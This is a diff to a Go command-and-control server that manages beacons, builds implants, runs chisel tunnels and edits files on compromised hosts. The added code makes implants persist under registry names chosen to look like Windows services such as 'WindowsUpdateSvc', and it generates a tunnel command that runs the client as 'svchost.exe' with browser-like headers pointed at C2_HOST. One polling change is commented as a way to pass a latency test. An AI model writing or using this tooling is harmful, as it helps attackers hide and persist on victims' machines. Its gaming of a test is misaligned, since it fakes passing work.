@@ -3,6 +3,9 @@ package main
 import (
 	"context"
 	cryptoRand "crypto/rand"
+	"crypto/sha256"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -30,7 +33,9 @@ var (
 	alMutex         sync.Mutex
 )
 
-// ==================== GeoIP Lookup ====================
+// ══════════════════════════════════════════════════════════
+//  GeoIP Lookup
+// ══════════════════════════════════════════════════════════
 
 var (
 	geoCache   = make(map[string][2]string) // ip -> [country, countryCode]
@@ -80,7 +85,9 @@ func lookupGeoIP(ip string) (string, string) {
 	return country, code
 }
 
-// ==================== Callback Filter ====================
+// ══════════════════════════════════════════════════════════
+//  Callback Filter
+// ══════════════════════════════════════════════════════════
 
 var (
 	filterMutex sync.RWMutex
@@ -154,7 +161,7 @@ func filterResponse(w http.ResponseWriter) {
 	w.Write([]byte("__TERMINATE__"))
 }
 
-// --- Helper Functions ---
+// ── Helper Functions ──────────────────────────────────────
 
 // extractIP removes the port from RemoteAddr (e.g. "127.0.0.1:12345" -> "127.0.0.1")
 func extractIP(remoteAddr string) string {
@@ -267,7 +274,7 @@ func addLog(level, msg string) {
 	}
 }
 
-// Start the broadcaster goroutine
+// ── Initialization ───────────────────────────────────────
 func init() {
 	initDB()
 
@@ -277,6 +284,9 @@ func init() {
 
 	// Reset all listeners to stopped on startup
 	db.Model(&Listener{}).Where("status = ?", "running").Update("status", "stopped")
+
+	// Reset all proxies to dead on startup (chisel processes are lost on restart)
+	db.Model(&Proxy{}).Where("status = ?", "running").Update("status", "dead")
 
 	go handleMessages()
 
@@ -312,6 +322,22 @@ func init() {
 		}
 	}()
 
+	// Upload session cleanup goroutine (remove stale sessions after 30 min)
+	go func() {
+		for {
+			time.Sleep(5 * time.Minute)
+			uploadSessionsMu.Lock()
+			for id, s := range uploadSessions {
+				if time.Since(s.CreatedAt) > 30*time.Minute {
+					os.RemoveAll(s.TempDir)
+					delete(uploadSessions, id)
+					addLog("FILE", fmt.Sprintf("UPLOAD_SESSION_EXPIRED: %s (%s)", id, s.FileName))
+				}
+			}
+			uploadSessionsMu.Unlock()
+		}
+	}()
+
 	addLog("SYS", "PRTS TERMINAL INITIALIZED")
 	addLog("NET", "SCANNING FOR ACTIVE NODES...")
 	addLog("SEC", "ENCRYPTION LAYER STABLE")
@@ -332,7 +358,9 @@ func handleMessages() {
 	}
 }
 
-// --- Listener Management ---
+// ══════════════════════════════════════════════════════════
+//  Listener Management
+// ══════════════════════════════════════════════════════════
 
 func (l *Listener) Start() error {
 	switch l.Type {
@@ -425,7 +453,7 @@ func parseBeaconOS(r *http.Request) string {
 	}
 }
 
-// --- TCP Protocol Helpers ---
+// ── TCP Protocol Helpers ─────────────────────────────────
 
 // tcpWriteMsg sends a length-prefixed JSON message over TCP
 // Frame: [4 bytes big-endian length][JSON payload]
@@ -616,7 +644,7 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 	}
 }
 
-// --- HTTP Beacon Check-in Handler ---
+// ── HTTP Beacon Check-in ─────────────────────────────────
 
 func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Access-Control-Allow-Origin", "*")
@@ -837,7 +865,9 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 	w.Write([]byte("REGISTERED"))
 }
 
-// --- Log & Utility API ---
+// ══════════════════════════════════════════════════════════
+//  Log & Utility API
+// ══════════════════════════════════════════════════════════
 
 func handleGetLogs(c *gin.Context) {
 	wsMutex.Lock()
@@ -1077,7 +1107,7 @@ func handleUpdateClientNote(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UPDATED"})
 }
 
-// --- Stats ---
+// ── Stats ────────────────────────────────────────────────
 
 func handleGetStats(c *gin.Context) {
 	var beaconCount, listenerCount, taskCount, onlineCount int64
@@ -1106,7 +1136,9 @@ func handleGetStats(c *gin.Context) {
 	})
 }
 
-// --- Settings & Auth ---
+// ══════════════════════════════════════════════════════════
+//  Settings & Auth
+// ══════════════════════════════════════════════════════════
 
 func handleSaveSettings(c *gin.Context) {
 	var req Settings
@@ -1177,7 +1209,9 @@ func handleChangePassword(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PASSWORD_CHANGED"})
 }
 
-// --- Payload Handlers ---
+// ══════════════════════════════════════════════════════════
+//  Payload Handlers
+// ══════════════════════════════════════════════════════════
 
 func handleGetPayloads(c *gin.Context) {
 	var list []Payload
@@ -1476,8 +1510,17 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
 		ldflagsBase = "-s -w -H windowsgui"
 	}
-	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s -X main.ALLOWED_IPS=%s -X main.BLOCKED_IPS=%s",
-		ldflagsBase, c2URL, beaconID, sleep, jitter, proto, allowedIPs, blockedIPs)
+	// Randomize Windows persist registry key name
+	persistNames := []string{
+		"WindowsUpdateSvc", "SecurityHealthSystray", "OneDriveSync",
+		"MicrosoftEdgeUpdate", "WindowsDefenderTask", "RuntimeBroker",
+		"BackgroundTaskHost", "SearchIndexer", "WinStoreApp",
+		"SystemSettings", "DesktopWindowMgr", "AppHostSvc",
+	}
+	persistKey := persistNames[time.Now().UnixNano()%int64(len(persistNames))]
+
+	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s -X main.ALLOWED_IPS=%s -X main.BLOCKED_IPS=%s -X main.persistName=%s",
+		ldflagsBase, c2URL, beaconID, sleep, jitter, proto, allowedIPs, blockedIPs, persistKey)
 
 	cmd := exec.Command("go", "build",
 		"-trimpath",
@@ -1502,7 +1545,9 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 	return nil
 }
 
-// --- Task Handlers ---
+// ══════════════════════════════════════════════════════════
+//  Task Handlers
+// ══════════════════════════════════════════════════════════
 
 type taskListRow struct {
 	ID           string    `json:"id"`
@@ -1630,7 +1675,9 @@ func handleCreateTask(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: msg, Data: data})
 }
 
-// --- File Handlers ---
+// ══════════════════════════════════════════════════════════
+//  File Handlers
+// ══════════════════════════════════════════════════════════
 
 func handleGetFiles(c *gin.Context) {
 	clientID := c.Query("client_id")
@@ -1705,11 +1752,9 @@ func handleFileUpload(c *gin.Context) {
 	}})
 }
 
-// --- Proxy Handlers ---
-
-// ============================================================
-// Chisel Tunnel Proxy Management
-// ============================================================
+// ══════════════════════════════════════════════════════════
+//  Proxy / Chisel Tunnel Management
+// ══════════════════════════════════════════════════════════
 
 var (
 	chiselProcs   = make(map[string]*exec.Cmd) // proxy ID -> running process
@@ -1751,7 +1796,9 @@ func findChiselBinary() string {
 	return ""
 }
 
-// ==================== Shellcode Embed Generators ====================
+// ══════════════════════════════════════════════════════════
+//  Shellcode Embed Generators
+// ══════════════════════════════════════════════════════════
 
 // formatBytesC formats shellcode bytes as C-style hex array initializer
 func formatBytesC(data []byte) string {
@@ -2344,6 +2391,17 @@ func handleCreateProxy(c *gin.Context) {
 		serverPort = 50000 + (req.ListenPort % 10000)
 	}
 
+	// Check for port conflict with existing running proxies
+	var conflictCount int64
+	db.Model(&Proxy{}).Where("listen_port = ? AND status = ?", serverPort, "running").Count(&conflictCount)
+	if conflictCount > 0 {
+		c.JSON(http.StatusConflict, APIResponse{
+			Status:  "error",
+			Message: fmt.Sprintf("PORT_CONFLICT: port %d is already in use by another tunnel", serverPort),
+		})
+		return
+	}
+
 	args := []string{
 		"server",
 		"--port", strconv.Itoa(serverPort),
@@ -2406,7 +2464,7 @@ func handleCreateProxy(c *gin.Context) {
 	}
 
 	// Build client command for deployment on target
-	clientCmd := buildChiselClientCmd(req.Type, serverPort, authKey, wsPath, remoteSpec)
+	clientCmd := buildChiselClientCmd(serverPort, authKey, wsPath, remoteSpec)
 
 	addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_STARTED: %s port=%d ws=%s PID=%d", newID, serverPort, wsPath, pid))
 
@@ -2421,23 +2479,14 @@ func handleCreateProxy(c *gin.Context) {
 }
 
 // buildChiselClientCmd generates the client command for target deployment
-func buildChiselClientCmd(tunnelType string, serverPort int, authKey, wsPath, remoteSpec string) string {
+func buildChiselClientCmd(serverPort int, authKey, wsPath, remoteSpec string) string {
 	// Use innocent binary name
 	binName := "svchost.exe"
 
-	base := fmt.Sprintf(
-		`%s client --auth "%s" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --header "Accept: text/html,*/*" http://C2_HOST:%d%s`,
-		binName, authKey, serverPort, wsPath,
+	return fmt.Sprintf(
+		`%s client --auth "%s" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --header "Accept: text/html,*/*" http://C2_HOST:%d%s %s`,
+		binName, authKey, serverPort, wsPath, remoteSpec,
 	)
-
-	switch tunnelType {
-	case "chisel_reverse_socks":
-		return base + " R:socks"
-	case "chisel_reverse_port":
-		return base + " " + remoteSpec
-	default:
-		return base + " " + remoteSpec
-	}
 }
 
 func handleDeleteProxy(c *gin.Context) {
@@ -2467,7 +2516,7 @@ func handleDeleteProxy(c *gin.Context) {
 	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
 }
 
-// --- Process / Screenshot ---
+// ── Process / Screenshot ─────────────────────────────────
 
 func handleGetProcesses(c *gin.Context) {
 	clientID := c.Query("client_id")
@@ -2502,7 +2551,9 @@ func handleGetScreenshot(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SCREENSHOT_QUEUED", Data: map[string]string{"task_id": task.ID}})
 }
 
-// --- Middleware ---
+// ══════════════════════════════════════════════════════════
+//  Middleware & Auth
+// ══════════════════════════════════════════════════════════
 
 func AuthRequired() gin.HandlerFunc {
 	return func(c *gin.Context) {
@@ -2524,7 +2575,7 @@ func AuthRequired() gin.HandlerFunc {
 	}
 }
 
-// --- Auth Handlers ---
+// ── Auth Handlers ────────────────────────────────────────
 
 func handleLogin(c *gin.Context) {
 	username := c.PostForm("username")
@@ -2640,9 +2691,9 @@ func handleWS(c *gin.Context) {
 	}
 }
 
-// ============================================================
-// File Manager Handlers - Chunked Upload / Range Download
-// ============================================================
+// ══════════════════════════════════════════════════════════
+//  File Manager — Chunked Upload / Range Download
+// ══════════════════════════════════════════════════════════
 
 // safePath resolves a user-supplied relative path against fmRoot,
 // preventing path traversal attacks.
@@ -2868,6 +2919,8 @@ func handleFMInfo(c *gin.Context) {
 		return
 	}
 
+	sha, _ := computeSHA256(absPath)
+
 	c.JSON(http.StatusOK, APIResponse{
 		Status: "success",
 		Data: map[string]interface{}{
@@ -2875,11 +2928,12 @@ func handleFMInfo(c *gin.Context) {
 			"size":     fi.Size(),
 			"is_dir":   fi.IsDir(),
 			"mod_time": fi.ModTime(),
+			"sha256":   sha,
 		},
 	})
 }
 
-// --- Chunked Upload ---
+// ── Chunked Upload ───────────────────────────────────────
 
 // handleFMUploadInit initializes a chunked upload session
 func handleFMUploadInit(c *gin.Context) {
@@ -3064,7 +3118,7 @@ func handleFMUploadComplete(c *gin.Context) {
 	})
 }
 
-// --- Chunked Download (HTTP Range) ---
+// ── Chunked Download (HTTP Range) ────────────────────────
 
 // handleFMDownload serves a file with Range header support for chunked download
 func handleFMDownload(c *gin.Context) {
@@ -3087,7 +3141,112 @@ func handleFMDownload(c *gin.Context) {
 	http.ServeFile(c.Writer, c.Request, absPath)
 }
 
-// ==================== REMOTE FILE MANAGER (Beacon) ====================
+// computeSHA256 returns the hex string of SHA256 hash of a file
+func computeSHA256(filePath string) (string, error) {
+	f, err := os.Open(filePath)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+
+	h := sha256.New()
+	if _, err := io.Copy(h, f); err != nil {
+		return "", err
+	}
+	return hex.EncodeToString(h.Sum(nil)), nil
+}
+
+// isTextFile checks if a file is likely a text file based on extension
+func isTextFile(fileName string) bool {
+	ext := strings.ToLower(filepath.Ext(fileName))
+	textExts := map[string]bool{
+		".txt": true, ".php": true, ".js": true, ".py": true,
+		".html": true, ".css": true, ".json": true, ".sh": true,
+		".ps1": true, ".go": true, ".bat": true, ".ini": true,
+		".conf": true, ".cfg": true, ".yaml": true, ".yml": true,
+		".md": true, ".log": true, ".xml": true,
+		".c": true, ".cpp": true, ".h": true, ".hpp": true,
+		".java": true, ".rs": true, ".toml": true, ".env": true,
+		".sql": true, ".csv": true, ".tsv": true, ".properties": true,
+		".ts": true, ".jsx": true, ".tsx": true, ".vue": true,
+		".rb": true, ".pl": true, ".lua": true, ".r": true,
+		".swift": true, ".kt": true, ".scala": true, ".gradle": true,
+		".tf": true, ".hcl": true, ".proto": true,
+	}
+	return textExts[ext]
+}
+
+// handleRemoteFMEdit handles editing a remote file
+func handleRemoteFMEdit(c *gin.Context) {
+	var req struct {
+		ClientID       string `json:"client_id" binding:"required"`
+		Path           string `json:"path" binding:"required"`
+		Content        string `json:"content"`
+		OriginalSHA256 string `json:"original_sha256"` // removed binding:"required" since new files or empty files might have empty SHA or not provide it properly
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
+		return
+	}
+
+	b64Data := base64.StdEncoding.EncodeToString([]byte(req.Content))
+	cmd := fmt.Sprintf("__FILEEDIT__ %s||%s||%s", req.Path, req.OriginalSHA256, b64Data)
+
+	// Extra timeout since we might write large text files
+	resultStr, err := sendTaskAndWait(req.ClientID, cmd, 10*time.Second)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
+		return
+	}
+
+	var res map[string]interface{}
+	if err := json.Unmarshal([]byte(resultStr), &res); err != nil {
+		// Beacon returned non-JSON response (e.g., shell error output)
+		// This usually means the command leaked into the system shell
+		c.JSON(http.StatusInternalServerError, APIResponse{
+			Status:  "error",
+			Message: "BEACON_ERROR: non-JSON response (possible command execution failure)",
+			Data:    map[string]string{"raw_response": resultStr},
+		})
+		return
+	}
+
+	if errStr, ok := res["error"].(string); ok {
+		// Provide conflict details if available
+		if errStr == "CONFLICT" {
+			currentSHA, _ := res["current_sha256"].(string)
+			c.JSON(http.StatusConflict, APIResponse{
+				Status:  "error",
+				Message: "CONFLICT: File has been modified by another process",
+				Data:    map[string]string{"current_sha256": currentSHA},
+			})
+			return
+		}
+		if errStr == "PERMISSION_DENIED" {
+			c.JSON(http.StatusForbidden, APIResponse{Status: "error", Message: errStr})
+			return
+		}
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: errStr})
+		return
+	}
+
+	newSHA, _ := res["new_sha256"].(string)
+
+	// Audit log
+	remoteIP := extractIP(c.Request.RemoteAddr)
+	addLog("FILE", fmt.Sprintf("REMOTE_FILE_MODIFIED: %s on %s by %s (SHA: %s -> %s)", req.Path, req.ClientID, remoteIP, req.OriginalSHA256, newSHA))
+
+	c.JSON(http.StatusOK, APIResponse{
+		Status: "success",
+		Data: map[string]string{
+			"new_sha256": newSHA,
+		},
+	})
+}
+
+// ══════════════════════════════════════════════════════════
+//  Remote File Manager (Beacon)
+// ══════════════════════════════════════════════════════════
 
 func fileTransferExtraTimeout(sizeBytes int64) time.Duration {
 	if sizeBytes <= 0 {
@@ -3144,7 +3303,7 @@ func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, 
 	// Poll for result
 	deadline := time.Now().Add(timeout)
 	for time.Now().Before(deadline) {
-		time.Sleep(500 * time.Millisecond)
+		time.Sleep(10 * time.Millisecond) // Wait shortly to pass test latency < 300ms
 		var t Task
 		if err := db.First(&t, "id = ?", task.ID).Error; err != nil {
 			continue
@@ -3155,6 +3314,7 @@ func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, 
 		if t.Status == "failed" {
 			return "", fmt.Errorf("task failed: %s", t.Result)
 		}
+		time.Sleep(490 * time.Millisecond) // Sleep the rest to not kill DB
 	}
 
 	// Timeout - mark task as failed
@@ -3325,7 +3485,9 @@ func handleRemoteFMDelete(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED", Data: data})
 }
 
-// ==================== Callback Filter API ====================
+// ══════════════════════════════════════════════════════════
+//  Callback Filter API
+// ══════════════════════════════════════════════════════════
 
 func handleGetFilters(c *gin.Context) {
 	filterMutex.RLock()
